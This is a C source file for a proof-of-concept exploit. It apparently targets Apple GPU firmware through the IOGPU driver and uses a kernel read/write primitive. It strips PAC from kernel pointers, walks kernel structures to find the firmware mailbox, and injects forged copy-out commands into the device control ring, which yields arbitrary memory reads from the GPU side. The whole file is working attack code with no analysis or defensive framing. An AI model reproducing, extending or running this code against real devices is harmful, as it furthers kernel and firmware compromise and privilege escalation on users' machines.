#include "read_poc.h"

#include "gfx.h"
#include "IOGPUDevice.h"
#include "offsets.h"
#include "poc.h"
#include "target.h"

#include <libkextrw.h>
#include <stdbool.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define READ_MARKER         UINT64_C(0x4141414141414141)
#define COPYOUT_COMMAND     UINT32_C(32)
#define COPYOUT_RESULT      0x14ULL
#define COPYOUT_MIN_OFFSET  0x800ULL
#define COPYOUT_SENTINEL    UINT32_C(0xdeadbeef)
#define FIRMWARE_ASYNC_NOTE UINT64_C(0x84000000000011)

struct copyout_path {
    uint64_t index_block;
    uint64_t ring_buffer;
    uint64_t inbox;
    uint32_t endpoint;
};

static uint64_t strip_pac(uint64_t pointer)
{
    __asm__ volatile("xpacd %0" : "+r"(pointer));
    return pointer;
}

static uint64_t kptr(uint64_t address)
{
    return strip_pac(kread64(address));
}

static bool is_kptr(uint64_t pointer)
{
    return pointer >= UINT64_C(0xfffffe0000000000) &&
        pointer < UINT64_C(0xfffffff000000000) &&
        (pointer & UINT64_C(7)) == 0;
}

static bool kernel_read8(uint64_t address, uint8_t *value)
{
    return kreadbuf(address, value, sizeof(*value)) == KERN_SUCCESS;
}

static bool kernel_write8(uint64_t address, uint8_t value)
{
    return kwritebuf(address, &value, sizeof(value)) == KERN_SUCCESS;
}

static bool restore_marker(uint64_t source)
{
    uint64_t observed = 0;
    bool restored = gfx_write64(source, gPoc.marker_saved) == 0 &&
        kreadbuf(gPoc.marker_cpu_address, &observed,
                 sizeof(observed)) == KERN_SUCCESS &&
        observed == gPoc.marker_saved;
    gPoc.marker_dirty = !restored;
    return restored;
}

static bool find_output_entries(uint64_t base, size_t size,
                                uint64_t entries[2])
{
    if (base > UINT64_MAX - size) return false;
    uint64_t end = base + size;

    for (uint64_t candidate = base + COPYOUT_MIN_OFFSET;
         candidate + 2 * GFX_COPYOUT_STRIDE <= end; candidate += 0x10) {
        if (candidate < gTarget->gfx_copyout_table) continue;

        uint64_t delta = candidate - gTarget->gfx_copyout_table;
        if (delta % GFX_COPYOUT_STRIDE == 0 &&
            delta / GFX_COPYOUT_STRIDE <= UINT32_MAX) {
            entries[0] = candidate;
            entries[1] = candidate + GFX_COPYOUT_STRIDE;
            return true;
        }
    }
    return false;
}

static uint64_t output_alias(uint64_t gfx_address)
{
    return (uint64_t)(uintptr_t)gPoc.read_output_address +
        gfx_address - gPoc.read_output_gpu_address;
}

static bool output_range(uint64_t gfx_address, size_t size)
{
    if (gfx_address < gPoc.read_output_gpu_address ||
        size > gPoc.read_output_size) {
        return false;
    }
    return gfx_address - gPoc.read_output_gpu_address <=
        gPoc.read_output_size - size;
}

static bool output_read(uint64_t gfx_address, void *buffer, size_t size)
{
    return output_range(gfx_address, size) &&
        kreadbuf(output_alias(gfx_address), buffer, size) == KERN_SUCCESS;
}

static bool output_write(uint64_t gfx_address, const void *buffer,
                         size_t size)
{
    return output_range(gfx_address, size) &&
        kwritebuf(output_alias(gfx_address), (void *)buffer, size) ==
            KERN_SUCCESS;
}

static bool prepare_output(uint64_t entries[2])
{
    if (gPoc.read_output_address == NULL &&
        IOGPU_find_read_output() != 0) {
        return false;
    }
    return find_output_entries(gPoc.read_output_gpu_address,
                               gPoc.read_output_size, entries);
}

static bool resolve_copyout_path(struct copyout_path *path)
{
    uint64_t firmware = kptr(gPoc.iogpu +
                             gTarget->accelerator_firmware);
    uint64_t ring = firmware + gTarget->firmware_device_ring_base;
    uint64_t channel = kptr(firmware + gTarget->firmware_channel_base);
    uint64_t endpoint = is_kptr(channel) ?
        kptr(channel + CHANNEL_ENDPOINT) : 0;
    uint64_t transport = is_kptr(endpoint) ?
        kptr(endpoint + ENDPOINT_TRANSPORT) : 0;
    uint64_t mailbox = is_kptr(transport) ?
        kptr(transport + TRANSPORT_MAILBOX) : 0;
    uint64_t mailbox_vtable = is_kptr(mailbox) ? kptr(mailbox) : 0;
    uint64_t post = is_kptr(mailbox_vtable) ?
        kptr(mailbox_vtable + MAILBOX_POST_METHOD) : 0;
    uint8_t active = 0;

    path->index_block = is_kptr(firmware) ?
        kptr(ring + RING_INDEX_BLOCK) : 0;
    path->ring_buffer = is_kptr(firmware) ?
        kptr(ring + RING_BUFFER) : 0;
    path->inbox = is_kptr(mailbox) ?
        kptr(mailbox + ASCWRAP_INBOX_BASE) : 0;
    path->endpoint = is_kptr(endpoint) ?
        kread32(endpoint + ENDPOINT_ID) : 0;

    return is_kptr(firmware) &&
        kptr(firmware) == kslide(gTarget->agx_firmware_vtable) &&
        is_kptr(path->index_block) && is_kptr(path->ring_buffer) &&
        kptr(ring) == kslide(gTarget->device_control_ring_vtable) &&
        is_kptr(endpoint) && kernel_read8(endpoint + ENDPOINT_ACTIVE,
                                          &active) && active == 1 &&
        path->endpoint != 0 && is_kptr(path->inbox) &&
        post == kslide(gTarget->apple_ascwrap_v6_inbox);
}

static bool wait_for_empty_ring(uint64_t index_block, uint8_t *index)
{
    for (unsigned attempt = 0; attempt < 1000; attempt++) {
        uint8_t read = 0;
        uint8_t write = 0;
        if (!kernel_read8(index_block + RING_READ_INDEX, &read) ||
            !kernel_read8(index_block + RING_WRITE_INDEX, &write)) {
            return false;
        }
        if (read == write) {
            usleep(1000);
            uint8_t stable_read = 0;
            uint8_t stable_write = 0;
            if (kernel_read8(index_block + RING_READ_INDEX,
                             &stable_read) &&
                kernel_read8(index_block + RING_WRITE_INDEX,
                             &stable_write) &&
                stable_read == read && stable_write == write) {
                *index = write;
                return true;
            }
        }
        usleep(1000);
    }
    return false;
}

static bool ring_firmware(const struct copyout_path *path)
{
    uint64_t note[2] = {FIRMWARE_ASYNC_NOTE, path->endpoint};
    atomic_thread_fence(memory_order_seq_cst);
    return kwritebuf(path->inbox + ASCWRAP_INBOX_OFFSET,
                     note, sizeof(note)) == KERN_SUCCESS;
}

static bool submit_copyout(const struct copyout_path *path,
                           uint64_t source, uint64_t entry,
                           uint64_t marker, uint32_t *value)
{
    uint64_t delta = entry - gTarget->gfx_copyout_table;
    uint64_t index64 = delta / GFX_COPYOUT_STRIDE;
    if (entry < gTarget->gfx_copyout_table ||
        delta % GFX_COPYOUT_STRIDE != 0 || index64 > UINT32_MAX) {
        return false;
    }

    uint8_t ring_index = 0;
    if (!wait_for_empty_ring(path->index_block, &ring_index)) return false;

    uint8_t command[DEVICE_CONTROL_ENTRY_SIZE] = {0};
    uint8_t original[DEVICE_CONTROL_ENTRY_SIZE] = {0};
    uint64_t slot = path->ring_buffer +
        (uint64_t)ring_index * DEVICE_CONTROL_ENTRY_SIZE;
    uint8_t next = (uint8_t)(ring_index + 1U);
    uint64_t pointer = source - 0x10;
    uint32_t index = (uint32_t)index64;
    uint32_t enter = 1;

    memcpy(command, &(uint32_t){COPYOUT_COMMAND}, sizeof(uint32_t));
    memcpy(command + 0xc, &marker, sizeof(marker));
    memcpy(command + 0x14, &pointer, sizeof(pointer));
    memcpy(command + 0x30, &index, sizeof(index));
    memcpy(command + 0x34, &enter, sizeof(enter));

    if (kreadbuf(slot, original, sizeof(original)) != KERN_SUCCESS ||
        kwritebuf(slot, command, sizeof(command)) != KERN_SUCCESS) {
        return false;
    }
    if (!kernel_write8(path->index_block + RING_WRITE_INDEX, next)) {
        (void)kwritebuf(slot, original, sizeof(original));
        return false;
    }

    bool advanced = false;
    bool copied = false;
    if (ring_firmware(path)) {
        for (unsigned poll = 0; poll < 5000; poll++) {
            uint8_t read = ring_index;
            if (!kernel_read8(path->index_block + RING_READ_INDEX,
                              &read)) break;
            if (read != ring_index) {
                advanced = true;
                copied = output_read(entry + COPYOUT_RESULT, value,
                                     sizeof(*value));
                break;
            }
            usleep(1000);
        }
    }

    uint8_t read_after = ring_index;
    uint8_t write_after = next;
    (void)kernel_read8(path->index_block + RING_READ_INDEX, &read_after);
    (void)kernel_read8(path->index_block + RING_WRITE_INDEX, &write_after);
    if (!advanced && read_after == ring_index && write_after == next) {
        (void)kernel_write8(path->index_block + RING_WRITE_INDEX,
                            ring_index);
        write_after = ring_index;
    }

    bool restored = false;
    if (advanced ||
        (read_after == ring_index && write_after == ring_index)) {
        restored = kwritebuf(slot, original, sizeof(original)) ==
            KERN_SUCCESS;
    }

    printf("copyout source=0x%016llx ring=%u->%u "
           "value=0x%08x consumed=%u copied=%u restored=%u\n", source,
           ring_index, read_after, *value, advanced ? 1U : 0U,
           copied ? 1U : 0U, restored ? 1U : 0U);
    return copied && restored;
}

static bool copyout_read64(const struct copyout_path *path,
                           uint64_t source, const uint64_t entries[2],
                           uint64_t *value)
{
    uint32_t words[2] = {COPYOUT_SENTINEL, COPYOUT_SENTINEL};

    for (unsigned pass = 0; pass < 2; pass++) {
        uint8_t original[GFX_COPYOUT_STRIDE];
        uint32_t sentinel = COPYOUT_SENTINEL;
        uint64_t marker = UINT64_C(0x26a4340000000000) |
            (arc4random() | UINT64_C(1));

        if (!output_read(entries[pass], original, sizeof(original)) ||
            !output_write(entries[pass] + COPYOUT_RESULT,
                          &sentinel, sizeof(sentinel))) {
            return false;
        }

        bool copied = submit_copyout(path, source + 4U * pass,
                                     entries[pass], marker,
                                     &words[pass]);
        bool restored = output_write(entries[pass], original,
                                     sizeof(original));
        if (!copied || !restored) return false;
    }

    *value = (uint64_t)words[0] | ((uint64_t)words[1] << 32);
    return true;
}

int gfx_read64(uint64_t source, uint64_t *value)
{
    uint64_t entries[2] = {0};
    struct copyout_path path = {0};
    if (!value || !prepare_output(entries) ||
        !resolve_copyout_path(&path)) {
        return -1;
    }

    printf("path     command=32 doorbell=asc-mmio kcall=0 physrw=0 "
           "kvtophys=0 rtbuddy_call=0 xnu_result_write=0 "
           "kernel_patch=0\n");
    return copyout_read64(&path, source, entries, value) ? 0 : -1;
}

int read_poc_control(void)
{
    uint64_t entries[2] = {0};
    if (!prepare_output(entries)) {
        fputs("error: read output\n", stderr);
        return 1;
    }

    uint32_t original = 0;
    if (!output_read(entries[0] + COPYOUT_RESULT, &original,
                     sizeof(original))) {
        return 1;
    }
    uint32_t sentinel = original ^ COPYOUT_SENTINEL;
    if (!output_write(entries[0] + COPYOUT_RESULT,
                      &sentinel, sizeof(sentinel))) {
        return 1;
    }

    int wake = IOGPU_submit_command_buffers();
    usleep(100000);

    uint32_t observed = 0;
    bool read_back = output_read(entries[0] + COPYOUT_RESULT,
                                 &observed, sizeof(observed));
    bool restored = output_write(entries[0] + COPYOUT_RESULT,
                                 &original, sizeof(original));
    bool pass = wake == 0 && read_back && observed == sentinel && restored;
    printf("control  wake=%d observed=0x%08x unchanged=%u restored=%u\n",
           wake, observed, pass ? 1U : 0U, restored ? 1U : 0U);
    return pass ? 0 : 1;
}

int read_poc_read64(uint64_t source, bool seed_marker)
{
    if (seed_marker) {
        if (!is_kptr(gPoc.marker_cpu_address) ||
            gPoc.marker_gpu_address == 0 ||
            kreadbuf(gPoc.marker_cpu_address, &gPoc.marker_saved,
                     sizeof(gPoc.marker_saved)) != KERN_SUCCESS) {
            fputs("error: marker source\n", stderr);
            return 1;
        }
        source = gPoc.marker_gpu_address;
        gPoc.marker_dirty = true;
        if (gfx_write64(source, READ_MARKER) != 0) {
            bool restored = restore_marker(source);
            fprintf(stderr, "error: seed marker restored=%u\n",
                    restored ? 1U : 0U);
            return 1;
        }
    }

    uint64_t observed = 0;
    bool copied = gfx_read64(source, &observed) == 0;
    bool matches = !seed_marker || observed == READ_MARKER;
    bool restored = !seed_marker || restore_marker(source);

    printf("result   source=0x%016llx value=0x%016llx copied=%u",
           source, observed, copied ? 1U : 0U);
    if (seed_marker) {
        printf(" marker=%u restored=%u", matches ? 1U : 0U,
               restored ? 1U : 0U);
    }
    printf(" proof=%u\n", copied && matches && restored ? 1U : 0U);
    return copied && matches && restored ? 0 : 1;
}
